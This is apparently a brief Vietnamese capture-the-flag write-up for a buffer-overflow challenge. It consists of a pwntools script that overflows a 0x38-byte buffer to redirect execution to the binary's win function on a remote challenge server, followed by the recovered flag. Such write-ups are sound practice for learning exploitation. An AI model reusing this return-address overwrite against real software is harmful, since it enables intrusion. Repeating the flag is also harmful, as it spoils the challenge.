đơn giản là BOF thôi hehe

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
context.binary = exe

p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*0x4013c1
# c
# ''')

# input()

p = remote("103.162.14.116", 12005)

payload = b'a'*0x38 + p64(exe.sym.win + 5) 
p.send(payload)



p.interactive()

# KCSC{bypass_strstr_by_null_byte}

```
# Flag 
KCSC{bypass_strstr_by_null_byte}
